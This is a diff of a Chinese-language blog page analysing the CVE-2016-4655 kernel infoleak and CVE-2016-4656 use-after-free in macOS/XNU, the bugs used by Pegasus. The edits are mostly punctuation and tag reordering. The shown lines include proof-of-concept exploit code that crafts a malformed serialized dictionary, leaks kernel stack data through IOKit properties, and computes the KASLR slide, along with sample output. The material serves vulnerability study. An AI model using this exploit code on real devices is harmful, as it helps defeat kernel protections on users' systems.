@@ -273,8 +273,8 @@ var _hmt = _hmt || [];
 <h3 id="CVE-2016-4655-infoleak"><a href="#CVE-2016-4655-infoleak" class="headerlink" title="CVE-2016-4655-infoleak"></a>CVE-2016-4655-infoleak</h3><p>和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。</p>
 <p>下面看漏洞点，回顾之前<code>kOSSerializeNumber</code>这个case内容</p>
 <figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> kOSSerializeNumber:</div><div class="line">    bufferPos += sizeof(long long);</div><div class="line">    <span class="keyword">if</span> (bufferPos &gt; bufferSize) break;</div><div class="line">    value = next[<span class="number">1</span>];</div><div class="line">    value &lt;&lt;= <span class="number">32</span>;</div><div class="line">    value |= next[<span class="number">0</span>];</div><div class="line">    o = OSNumber::withNumber(value, len);</div><div class="line">    next += <span class="number">2</span>;</div><div class="line">    break;</div><div class="line">```  </div><div class="line"></div><div class="line">这里存在什么问题呢？这里没有检查`OSNumber`的长度，也就是说我们可以创建一个任意长度的`OSNumber`，进而在内核读取的时候越界，然后泄漏内核地址信息。</div><div class="line"></div><div class="line">### CVE<span class="number">-2016</span><span class="number">-4656</span>-UAF漏洞</div><div class="line">UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。  </div><div class="line">来看下漏洞点，下面的代码是序列化字典dic将`OSString`这个键转化为`OSSymbol`，见下</div></pre></td></tr></table></figure>
-<p>if (dict)<br>{<br>        if (sym)<br>        {<br>            …<br>        }<br>        else<br>        {<br>            sym = OSDynamicCast(OSSymbol, o);<br>            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))<br>            {<br>                sym = (OSSymbol *) OSSymbol::withString(str);<br>                o-&gt;release();<br>                o = 0;<br>            }<br>            ok = (sym != 0);<br>        }<br>    }<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这里`o-&gt;release()`有什么问题呢?还记得`objsArray`吧，用来存储所有的对象，但是用`setAtIndex`这个宏来将所有的对象`o`存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面`kOSSerializeObject`中的`switchcase`：</div></pre></td></tr></table></figure></p>
-<p>case kOSSerializeObject:<br>    if (len &gt;= objsIdx) break;<br>    o = objsArray[len];<br>    o-&gt;retain();<br>    isRef = true;<br>    break;<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">此时之前存储在之前的`objsArray`的`OSString`已经free，而 `o = objsArray[len]; o-&gt;retain();`由对其进行了`retain`引用，好的一个完美的UAF漏洞。  </div><div class="line">所以我们可以构造一个字典`dic`，其中`OSString`包含一些配对的值，然后序列化一个`kOSSerializeObject`引用对象，`OSString`将调用`retain`，但却是一个被释放的对象。  </div><div class="line"></div><div class="line">## <span class="number">0x04</span> 漏洞利用-PoC分析</div><div class="line">同样分为两个漏洞利用：<span class="number">1</span>，CVE<span class="number">-2016</span><span class="number">-4655</span>-infoleak漏洞利用；<span class="number">2</span>，CVE<span class="number">-2016</span><span class="number">-4656</span>-UAF漏洞利用</div><div class="line"></div><div class="line">### CVE<span class="number">-2016</span><span class="number">-4655</span>-infoleak漏洞利用</div><div class="line">infoleak漏洞利用步骤：</div><div class="line"></div><div class="line"> * 构造一个包含过长的`OSNumber`dic字典</div><div class="line"> * 用这个序列化字典去设置userclient对象的属性</div><div class="line"> * 读回设置的`OSNumber`属性，造成infoleak</div><div class="line"> * 利用读取回来的内核地址信息计算KASLR    </div><div class="line"></div><div class="line">完整的代码：</div></pre></td></tr></table></figure></p>
+<p>if (dict)<br>{<br>        if (sym)<br>        {<br>            …<br>        }<br>        else<br>        {<br>            sym = OSDynamicCast(OSSymbol, o);<br>            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))<br>            {<br>                sym = (OSSymbol *) OSSymbol::withString(str);<br>                o-&gt;release();<br>                o = 0;<br>            }<br>            ok = (sym != 0);<br>        }<br>    }<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这里`o-&gt;release()`有什么问题呢?还记得`objsArray`吧，用来存储所有的对象，但是用`setAtIndex`这个宏来将所有的对象`o`存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面`kOSSerializeObject`中的`switchcase`。</div></pre></td></tr></table></figure></p>
+<p>case kOSSerializeObject:<br>    if (len &gt;= objsIdx) break;<br>    o = objsArray[len];<br>    o-&gt;retain();<br>    isRef = true;<br>    break;<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">此时之前存储在之前的`objsArray`的`OSString`已经free，而 `o = objsArray[len]; o-&gt;retain();`由对其进行了`retain`引用，好的一个完美的UAF漏洞。  </div><div class="line">所以我们可以构造一个字典`dic`，其中`OSString`包含一些配对的值，然后序列化一个`kOSSerializeObject`引用对象，`OSString`将调用`retain`，但却是一个被释放的对象。  </div><div class="line"></div><div class="line">## <span class="number">0x04</span> 漏洞利用-PoC分析</div><div class="line">同样分为两个漏洞利用：<span class="number">1</span>，CVE<span class="number">-2016</span><span class="number">-4655</span>-infoleak漏洞利用；<span class="number">2</span>，CVE<span class="number">-2016</span><span class="number">-4656</span>-UAF漏洞利用</div><div class="line"></div><div class="line">### CVE<span class="number">-2016</span><span class="number">-4655</span>-infoleak漏洞利用</div><div class="line">infoleak漏洞利用步骤：</div><div class="line"></div><div class="line"> * 构造一个包含过长的`OSNumber`dic字典</div><div class="line"> * 用这个序列化字典去设置userclient对象的属性</div><div class="line"> * 读回设置的`OSNumber`属性，造成infoleak</div><div class="line"> * 利用读取回来的内核地址信息计算KASLR    </div><div class="line"></div><div class="line">完整的代码。</div></pre></td></tr></table></figure></p>
 <p>uint64_t kslide_infoleak(void)<br>{<br>    kern_return_t kr = 0, err = 0;<br>    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;</p>
 <pre><code>io_service_t serv = 0;
 io_connect_t conn = 0;
@@ -331,9 +331,9 @@ kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;
 printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);
 
 return kslide;
-</code></pre><p>}<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#### 构造字典</div></pre></td></tr></table></figure></p>
+</code></pre><p>}<br><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"><span class="clean">#### 构造字典</span></div><div class="line"></div><div class="line">看下面这段代码</div></pre></td></tr></table></figure></p>
 <p>void *dict = calloc(1, 512);<br>uint32_t idx = 0; // index into our data</p>
-<p>#define WRITE_IN(dict, data) do { <em>(uint32_t </em>)(dict + idx) = (data); idx += 4; } while (0)<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">`WRITE_IN `这个宏只是为了方便我们将数据填入内存之中  </div><div class="line"></div><div class="line">xml的字典格式</div></pre></td></tr></table></figure></p>
+<p>#define WRITE_IN(dict, data) do { <em>(uint32_t </em>)(dict + idx) = (data); idx += 4; } while (0)<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">这里的`WRITE_IN `这个宏只是为了方便我们将数据填入内存之中  </div><div class="line"></div><div class="line">xml的字典格式</div></pre></td></tr></table></figure></p>
 <p><dict><br>    <symbol>AAA</symbol><br>    <number size="0x200">0x4141414141414141</number><br></dict><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">对应的代码</div></pre></td></tr></table></figure></p>
 <p>WRITE_IN(dict, (0x000000d3)); // 头部签名</p>
 <p>WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典</p>
@@ -342,12 +342,12 @@ return kslide;
 <p>host_get_io_master(mach_host_self(), &amp;master); // get iokit master port</p>
 <p>kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);<br>if (kr == KERN_SUCCESS) {<br>    printf(“(+) Dictionary is valid! Spawning user client…\n”);<br>} else<br>    return -1;<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">若`kr == KERN_SUCCESS`则我们的`dic`则为有效</div><div class="line"></div><div class="line">#### 生成UserClient设定属性</div><div class="line">我们需要一个`UserClient`用来和内核通信，所以使用`io_service_open_extended`来产生一个相关服务的`UserClient`，这里的服务并不重要</div></pre></td></tr></table></figure></p>
 <p>serv = IOServiceGetMatchingService(master, IOServiceMatching(“IOHDIXController”));</p>
-<p>kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);<br>if (kr == KERN_SUCCESS) {<br>    printf(“(+) UC successfully spawned! Leaking bytes…\n”);<br>} else<br>    return -1;<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">首先我们通过`IOServiceGetMatchingService`去从`IORegistry`里匹配一个特定服务，然后通过`io_service_open_extended`让可以设置其属性并打开一个服务即隐式产生`UserClient`  </div><div class="line">接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代`IORegistry`找到刚刚创建的`UserClient`</div></pre></td></tr></table></figure></p>
+<p>kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);<br>if (kr == KERN_SUCCESS) {<br>    printf(“(+) UC successfully spawned! Leaking bytes…\n”);<br>} else<br>    return -1;<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">首先我们通过`IOServiceGetMatchingService`去从`IORegistry`里匹配一个特定服务，然后通过`io_service_open_extended`让可以设置其属性并打开一个服务即隐式产生`UserClient`  </div><div class="line">接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代`IORegistry`找到刚刚创建的`UserClient`。</div></pre></td></tr></table></figure></p>
 <p>IORegistryEntryCreateIterator(serv, “IOService”, kIORegistryIterateRecursively, &amp;iter);<br>io_object_t object = IOIteratorNext(iter);<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">先通过`serv`端口创建`io_iterator_t`，我们的`UserClient`在`serv`创建之后，所以拿到`iter`后迭代一次即为我们的`UserClient`，现在就可以读取其属性并触发info-leak。</div><div class="line"></div><div class="line">#### 读取属性，触发info-leak</div></pre></td></tr></table></figure></p>
 <p>char buf[0x200] = {0};<br>mach_msg_type_number_t bufCnt = 0x200;</p>
 <p>kr = io_registry_entry_get_property_bytes(object, “AAA”, (char *)&amp;buf, &amp;bufCnt);<br>if (kr == KERN_SUCCESS) {<br>    printf(“(+) Done! Calculating KASLR slide…\n”);<br>} else<br>    return -1;<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过`io_registry_entry_get_property_bytes`我们可以获取到原始字节，存在`buf`中，我们打印其值</div></pre></td></tr></table></figure></p>
 <p>for (uint32_t k = 0; k &lt; 128; k += 8) {<br>    printf(“%#llx\n”, <em>(uint64_t </em>)(buf + k));<br>}<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">对应输出：</div></pre></td></tr></table></figure></p>
-<p>0x4141414141414141  // 有效的number<br>0xffffff8033c66284  //<br>0xffffff8035b5d800  //<br>0x4                 // 其他数据或返回地址<br>0xffffff803506d5a0  //<br>0xffffff8033c662b4  //<br>0xffffff818d2b3e30  //<br>0xffffff80037934bf  // 函数返回地址<br>…<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数  </div><div class="line">这里实际读取的代码位于`is_io_registry_entry_get_property_bytes`函数，即`io_registry_entry_get_property_bytes`调用了 `is_io_registry_entry_get_property_bytes`</div><div class="line"></div><div class="line">`is_io_registry_entry_get_property_bytes`源代码</div></pre></td></tr></table></figure></p>
+<p>0x4141414141414141  // 有效的number<br>0xffffff8033c66284  //<br>0xffffff8035b5d800  //<br>0x4                 // 其他数据或返回地址<br>0xffffff803506d5a0  //<br>0xffffff8033c662b4  //<br>0xffffff818d2b3e30  //<br>0xffffff80037934bf  // 函数返回地址<br>…<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数  </div><div class="line">这里实际读取的代码位于`is_io_registry_entry_get_property_bytes`函数，即`io_registry_entry_get_property_bytes`调用了 `is_io_registry_entry_get_property_bytes`。</div><div class="line"></div><div class="line">`is_io_registry_entry_get_property_bytes`源代码</div></pre></td></tr></table></figure></p>
 <p>/<em> Routine io_registry_entry_get_property </em>/<br>kern_return_t is_io_registry_entry_get_property_bytes(<br>    io_object_t registry_entry,<br>    io_name_t property_name,<br>    io_struct_inband_t buf,<br>    mach_msg_type_number_t <em>dataCnt )<br>{<br>    OSObject    </em>    obj;<br>    OSData     <em>    data;<br>    OSString     </em>    str;<br>    OSBoolean    <em>    boo;<br>    OSNumber     </em>    off;<br>    UInt64        offsetBytes;<br>    unsigned int    len = 0;<br>    const void *    bytes = 0;<br>    IOReturn        ret = kIOReturnSuccess;</p>
 <pre><code>CHECK( IORegistryEntry, registry_entry, entry );
 </code></pre><p>#if CONFIG_MACF<br>    if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name))<br>        return kIOReturnNotPermitted;</p>
@@ -1609,6 +1609,18 @@ if (kr != KERN_SUCCESS)
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Protostar</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">堆溢出</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Pegasus</a>
               </li>
              
@@ -1622,18 +1634,6 @@ if (kr != KERN_SUCCESS)
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">PoC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Protostar</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">堆溢出</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1661,19 +1661,19 @@ if (kr != KERN_SUCCESS)
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">调试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">printf</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">format</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">调试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1689,18 +1689,6 @@ if (kr != KERN_SUCCESS)
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xnu</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">macos内核</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">BSD</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">mach-o</a>
               </li>
              
@@ -1710,6 +1698,18 @@ if (kr != KERN_SUCCESS)
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">stub</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">xnu</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">macos内核</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">BSD</a>
               </li>
             
             <div class="clearfix"></div>
